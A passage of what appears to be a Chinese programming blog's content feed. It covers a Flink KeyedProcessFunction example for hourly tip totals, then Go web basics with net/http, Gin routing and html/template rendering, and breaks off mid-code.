在初始化期间调用一次。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">        . . .</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 每个票价事件（TaxiFare-Event）输入（到达）时调用，以处理输入的票价事件。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            TaxiFare fare,</span></span></span><br><span class="line"><span class="params"><span class="function">            Context ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">            Collector&lt;Tuple3&lt;Long, Long, Float&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        . . .</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 当当前水印（watermark）表明窗口现在需要完成的时候调用。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, </span></span></span><br><span class="line"><span class="params"><span class="function">            OnTimerContext context, </span></span></span><br><span class="line"><span class="params"><span class="function">            Collector&lt;Tuple3&lt;Long, Long, Float&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        . . .</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意事项：</p>
<ul>
<li>有几种类型的 ProcessFunctions – 不仅包括 <code>KeyedProcessFunction</code>，还包括 <code>CoProcessFunctions</code>、<code>BroadcastProcessFunctions</code> 等.</li>
<li><code>KeyedProcessFunction</code> 是一种 <code>RichFunction</code>。作为 <code>RichFunction</code>，它可以访问使用 Managed Keyed State 所需的 <code>open</code> 和 <code>getRuntimeContext</code> 方法。</li>
<li>有两个回调方法须要实现： <code>processElement</code> 和 <code>onTimer</code>。每个输入事件都会调用 <code>processElement</code> 方法； 当计时器触发时调用 <code>onTimer</code>。它们可以是基于事件时间（event time）的 timer，也可以是基于处理时间（processing time）的 timer。 除此之外，<code>processElement</code> 和 <code>onTimer</code> 都提供了一个上下文对象，该对象可用于与 <code>TimerService</code> 交互。 这两个回调还传递了一个可用于发出结果的 <code>Collector</code>。</li>
</ul>
<h5 id="open-方法"><a href="#open-方法" class="headerlink" title="open() 方法"></a><code>open()</code> 方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每个窗口都持有托管的 Keyed state 的入口，并且根据窗口的结束时间执行 keyed 策略。</span></span><br><span class="line"><span class="comment">// 每个司机都有一个单独的MapState对象。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> MapState&lt;Long, Float&gt; sumOfTips;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    MapStateDescriptor&lt;Long, Float&gt; sumDesc =</span><br><span class="line">            <span class="keyword">new</span> MapStateDescriptor&lt;&gt;(<span class="string">&quot;sumOfTips&quot;</span>, Long.class, Float.class);</span><br><span class="line">    sumOfTips = getRuntimeContext().getMapState(sumDesc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于票价事件（fare-event）可能会乱序到达，有时需要在计算输出前一个小时结果前，处理下一个小时的事件。 这样能够保证“乱序造成的延迟数据”得到正确处理（放到前一个小时中）。 实际上，如果 Watermark 延迟比窗口长度长得多，则可能有多个窗口同时打开，而不仅仅是两个。 此实现通过使用 <code>MapState</code> 来支持处理这一点，该 <code>MapState</code> 将每个窗口的结束时间戳映射到该窗口的小费总和。</p>
<h5 id="processElement-方法"><a href="#processElement-方法" class="headerlink" title="processElement() 方法"></a><code>processElement()</code> 方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        TaxiFare fare,</span></span></span><br><span class="line"><span class="params"><span class="function">        Context ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">        Collector&lt;Tuple3&lt;Long, Long, Float&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> eventTime = fare.getEventTime();</span><br><span class="line">    TimerService timerService = ctx.timerService();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (eventTime &lt;= timerService.currentWatermark()) &#123;</span><br><span class="line">        <span class="comment">// 事件延迟；其对应的窗口已经触发。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 将 eventTime 向上取值并将结果赋值到包含当前事件的窗口的末尾时间点。</span></span><br><span class="line">        <span class="keyword">long</span> endOfWindow = (eventTime - (eventTime % durationMsec) + durationMsec - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在窗口完成时将启用回调</span></span><br><span class="line">        timerService.registerEventTimeTimer(endOfWindow);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将此票价的小费添加到该窗口的总计中。</span></span><br><span class="line">        Float sum = sumOfTips.get(endOfWindow);</span><br><span class="line">        <span class="keyword">if</span> (sum == <span class="keyword">null</span>) &#123;</span><br><span class="line">            sum = <span class="number">0.0F</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += fare.tip;</span><br><span class="line">        sumOfTips.put(endOfWindow, sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要考虑的事项：</p>
<ul>
<li>延迟的事件怎么处理？watermark 后面的事件（即延迟的）正在被删除。 如果你想做一些比这更高级的操作，可以考虑使用旁路输出（Side outputs），这将在<a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/learn-flink/event_driven/#side-outputs">下一节</a>中解释。</li>
<li>本例使用一个 <code>MapState</code>，其中 keys 是时间戳（timestamp），并为同一时间戳设置一个 Timer。 这是一种常见的模式；它使得在 Timer 触发时查找相关信息变得简单高效。</li>
</ul>
<h5 id="onTimer-方法"><a href="#onTimer-方法" class="headerlink" title="onTimer() 方法"></a><code>onTimer()</code> 方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">long</span> timestamp, </span></span></span><br><span class="line"><span class="params"><span class="function">        OnTimerContext context, </span></span></span><br><span class="line"><span class="params"><span class="function">        Collector&lt;Tuple3&lt;Long, Long, Float&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> driverId = context.getCurrentKey();</span><br><span class="line">    <span class="comment">// 查找刚结束的一小时结果。</span></span><br><span class="line">    Float sumOfTips = <span class="keyword">this</span>.sumOfTips.get(timestamp);</span><br><span class="line"></span><br><span class="line">    Tuple3&lt;Long, Long, Float&gt; result = Tuple3.of(driverId, timestamp, sumOfTips);</span><br><span class="line">    out.collect(result);</span><br><span class="line">    <span class="keyword">this</span>.sumOfTips.remove(timestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>传递给 <code>onTimer</code> 的 <code>OnTimerContext context</code> 可用于确定当前 key。</li>
<li>我们的 pseudo-windows 在当前 Watermark 到达每小时结束时触发，此时调用 <code>onTimer</code>。 这个 <code>onTimer</code> 方法从 <code>sumOfTips</code> 中删除相关的条目，这样做的效果是不可能容纳延迟的事件。 这相当于在使用 Flink 的时间窗口时将 allowedLateness 设置为零。</li>
</ul>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>GO_Web</title>
    <url>/2020/03/03/GO-Web/</url>
    <content><![CDATA[<p>GO Web 冲冲冲，Gin 冲冲冲</p>
<span id="more"></span>

<p>学习资料：<a href="https://www.liwenzhou.com/posts/Go/go_menu/">https://www.liwenzhou.com/posts/Go/go_menu/</a></p>
<h3 id="net-http"><a href="#net-http" class="headerlink" title="net/http"></a>net/http</h3><h4 id="默认服务器实例"><a href="#默认服务器实例" class="headerlink" title="默认服务器实例"></a>默认服务器实例</h4><p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	b, _ := ioutil.ReadFile(<span class="string">&quot;./hello.txt&quot;</span>)</span><br><span class="line">	fmt.Fprintln(w, <span class="keyword">string</span>(b))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/GO&quot;</span>, sayhello)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;http serve failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hello.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1 style=&#x27;color:red&#x27;&gt;Hello Golang!&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;xiaoyuyu is coming!!!&lt;/h2&gt;</span><br><span class="line">&lt;img id=&#x27;james&#x27; src=&#x27;https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=2488306765,3803818039&amp;fm=26&amp;gp=0.jpg&#x27;&gt;</span><br><span class="line">&lt;button id=&#x27;b1&#x27;&gt;湖人总冠军&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&#x27;b1&#x27;).onclick=function()&#123;</span><br><span class="line">    document.getElementById(&#x27;james&#x27;).src=&#x27;https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=13399677,205968108&amp;fm=26&amp;gp=0.jpg&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h3><p>先换个国内镜像，不然go get容易挂，而且以后build之前就需要<strong>go mod init</strong>了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> env -w GO111MODULE=on</span><br><span class="line"><span class="keyword">go</span> env -w GOPROXY=https:<span class="comment">//goproxy.cn,direct</span></span><br></pre></td></tr></table></figure>

<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhello</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello Golang!&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建一个默认的路由引擎</span></span><br><span class="line">	r := gin.Default()</span><br><span class="line">	<span class="comment">// 指定用户只用GET请求访问/Go时，执行sayhello这个函数</span></span><br><span class="line">	r.GET(<span class="string">&quot;/GO&quot;</span>, sayhello)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//book</span></span><br><span class="line">	r.GET(<span class="string">&quot;/book&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/book&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.PUT(<span class="string">&quot;/book&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;method&quot;</span>: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.DELETE(<span class="string">&quot;/book&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;method&quot;</span>: <span class="string">&quot;DELETE&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 启动服务</span></span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用<code>postman</code>测试</p>
<h4 id="RESTful-API"><a href="#RESTful-API" class="headerlink" title="RESTful API"></a>RESTful API</h4><p>简单来说，REST的含义就是客户端与Web服务器之间进行交互的时候，使用HTTP协议中的4个请求方法代表不同的动作。</p>
<ul>
<li><code>GET</code>用来获取资源</li>
<li><code>POST</code>用来新建资源</li>
<li><code>PUT</code>用来更新资源</li>
<li><code>DELETE</code>用来删除资源</li>
</ul>
<h4 id="HTML渲染"><a href="#HTML渲染" class="headerlink" title="HTML渲染"></a>HTML渲染</h4><p>前后端分离用JS的话，用这种渲染方法比较少了，也看一下</p>
<h5 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h5><p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">//解析模板</span></span><br><span class="line">	t, err := template.ParseFiles(<span class="string">&quot;./hello.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Parse template failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//渲染模板</span></span><br><span class="line">	name := <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	err = t.Execute(w, name)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed, err:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/hello&quot;</span>, sayhello)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:9000&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;HTTP serve failed, err:5v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>template</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;Hello &#123;&#123; . &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h5><p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name   <span class="keyword">string</span></span><br><span class="line">	Gender <span class="keyword">string</span></span><br><span class="line">	Age    <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">//解析模板</span></span><br><span class="line">	t, err := template.ParseFiles(<span class="string">&quot;./hello.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Parse template failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	u1 := user&#123;</span><br><span class="line">		Name:   <span class="string">&quot;xiaoyuyu&quot;</span>,</span><br><span class="line">		Gender: <span class="string">&quot;male&quot;</span>,</span><br><span class="line">		Age:    <span class="number">18</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//渲染模板</span></span><br><span class="line">	<span class="comment">//name := &quot;xiaoyuyu&quot;</span></span><br><span class="line">	<span class="comment">//还可以传输map</span></span><br><span class="line">	m1 := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">		<span class="string">&quot;name&quot;</span>:   <span class="string">&quot;louwin&quot;</span>,</span><br><span class="line">		<span class="string">&quot;gender&quot;</span>: <span class="string">&quot;male&quot;</span>,</span><br><span class="line">		<span class="string">&quot;age&quot;</span>:    <span class="number">22</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	hobby := []<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;唱&quot;</span>,</span><br><span class="line">		<span class="string">&quot;跳&quot;</span>,</span><br><span class="line">		<span class="string">&quot;rap&quot;</span>,</span><br><span class="line">		<span class="string">&quot;篮球&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	err = t.Execute(w, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">		<span class="string">&quot;u1&quot;</span>:    u1,</span><br><span class="line">		<span class="string">&quot;m1&quot;</span>:    m1,</span><br><span class="line">		<span class="string">&quot;hobby&quot;</span>: hobby,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed, err:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/hello&quot;</span>, sayhello)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:9000&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;HTTP serve failed, err:5v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>template</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;u1&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Hello &#123;&#123; .u1.Name &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Age: &#123;&#123; .u1.Age &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Gender: &#123;&#123; .u1.Gender &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;&#123;/* 遇事不决写注释 */&#125;&#125;</span><br><span class="line">&lt;p&gt;m1&lt;/p&gt;</span><br><span class="line">&#123;&#123;with .m1&#125;&#125;</span><br><span class="line">&lt;p&gt;Hello &#123;&#123; .name &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Age: &#123;&#123; .age &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Gender: &#123;&#123; .gender &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;&#123; $v1:=100 &#125;&#125;</span><br><span class="line">&#123;&#123; $age:=.m1.age &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; if $v1 &#125;&#125;</span><br><span class="line">&#123;&#123; $v1 &#125;&#125;</span><br><span class="line">&#123;&#123; else &#125;&#125;</span><br><span class="line">nothing</span><br><span class="line">&#123;&#123; end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;&#123; range $idx, $hobby := .hobby &#125;&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123;$idx&#125;&#125; - &#123;&#123;$hobby&#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;&#123; else &#125;&#125;</span><br><span class="line">    nothing</span><br><span class="line">&#123;&#123; end &#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;&#123;index .hobby 2&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h5><p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">//定义模板</span></span><br><span class="line">	<span class="comment">//自定义函数</span></span><br><span class="line">	k := <span class="function"><span class="keyword">func</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">		<span class="keyword">return</span> name + <span class="string">&quot;真可爱&quot;</span>, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//解析模板</span></span><br><span class="line">	t := template.New(<span class="string">&quot;hello.tmpl&quot;</span>)</span><br><span class="line">	t.Funcs(template.FuncMap&#123;</span><br><span class="line">		<span class="string">&quot;kua&quot;</span>: k,</span><br><span class="line">	&#125;)</span><br><span class="line">	_, err := t.ParseFiles(<span class="string">&quot;./hello.tmpl&quot;</span>, <span class="string">&quot;./ul.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;prase failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	t.Execute(w, name)</span><br><span class="line">	<span class="comment">//渲染模板</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/hello&quot;</span>, sayhello)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;http serve failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>template</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;自定义函数&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; kua . &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;h3&gt;测试嵌套template语法&lt;/h3&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;&#123;template &quot;ul.tmpl&quot;&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;h3&gt;测试宏定义template语法&lt;/h3&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;&#123;template &quot;ol.tmpl&quot;&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123; define &quot;ol.tmpl&quot;&#125;&#125;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;吃饭&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;睡觉&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;打豆豆&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;注释&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;日志&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;测试&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<h5 id="top"><a href="#top" class="headerlink" title="top"></a>top</h5><p><code>block</code>是定义模板，典型的用法是定义一组根模板，然后通过在其中重新定义块模板进行自定义</p>
<p>利用这个特性，可以实现模板的<strong>继承</strong></p>
<p>server</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;text/template&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">//定义模板</span></span><br><span class="line">	<span class="comment">//解析模板</span></span><br><span class="line">	t, err := template.ParseFiles(<span class="string">&quot;./templates/basic.tmpl&quot;</span>, <span class="string">&quot;./templates/index.tmpl&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;parse failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span 